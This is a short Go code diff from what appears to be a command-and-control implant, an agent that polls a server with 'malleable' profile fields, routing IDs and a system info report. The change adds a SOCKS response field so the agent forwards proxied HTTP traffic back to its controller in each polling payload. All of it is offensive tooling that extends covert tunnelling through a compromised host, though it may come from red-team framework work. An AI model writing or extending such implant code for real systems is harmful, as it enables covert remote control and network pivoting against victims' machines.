@@ -81,6 +81,7 @@ var (
 	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
 	MALLEABLE_ROUTING_ID_FIELD          = "r"
 	MALLEABLE_PAYLOAD_FIELD             = "p"
+	MALLEABLE_SOCKS_RESP_FIELD          = "sr"
 )
 
 // PollConfig holds the configuration for polling behavior
@@ -819,13 +820,16 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 			// Collect unlink notifications (routing IDs that have been disconnected)
 			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
 
+			// Check for SOCKS HTTP responses
+			hasSocksResp := HasPendingSocksResponses()
+
 			// Handle pending results before sleep
 			hasResults := resultManager.HasResults()
 			hasLinkData := len(linkData) > 0
 			hasLinkHandshake := linkHandshake != nil
 			hasUnlinkNotifications := len(unlinkNotifications) > 0
 
-			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
+			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResp {
 				results := resultManager.GetPendingResults()
 				payload := make(map[string]interface{})
 				payload[getPollStr(idxPollAgentId)] = clientID
@@ -842,6 +846,12 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				}
 				if hasUnlinkNotifications {
 					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
+				}
+				if hasSocksResp {
+					socksResp := GetSocksHTTPResponses()
+					if len(socksResp) > 0 {
+						payload[MALLEABLE_SOCKS_RESP_FIELD] = socksResp
+					}
 				}
 
 				jsonData, err := json.Marshal(payload)
